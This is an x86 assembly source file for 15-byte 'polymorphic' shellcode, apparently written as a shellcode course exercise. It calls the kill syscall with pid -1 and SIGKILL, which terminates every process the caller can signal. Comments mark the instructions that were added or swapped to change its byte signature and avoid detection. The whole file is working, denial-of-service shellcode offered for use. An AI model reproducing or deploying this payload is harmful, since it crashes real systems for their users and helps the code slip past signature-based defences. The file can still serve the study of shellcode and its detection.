; Filename: killall_poly.nasm
; Author: h3ll0clar1c3
; Purpose: Terminates processes running on the local host
; Compilation: ./compile.sh killall_poly
; Usage: ./killall_poly
; Shellcode size: 15 bytes
; Architecture: x86

global   _start

section .text
        _start:

	sub eax, eax			; initialize register // added instruction
	mov al, 0x25			; move 0x25 into al // changed the method
	sub ebx, ebx			; initialize register // added instruction
	dec ebx				; decrement ebx // replaced push 0xffffffff
	sub ecx, ecx			; initialize register // added instruction
	mov cl, 0xf7			; move 0xf7 into cl // added instruction
	neg cl				; negates 0xf7 // added instruction
	int 0x80			; call the interrupt to execute the syscall

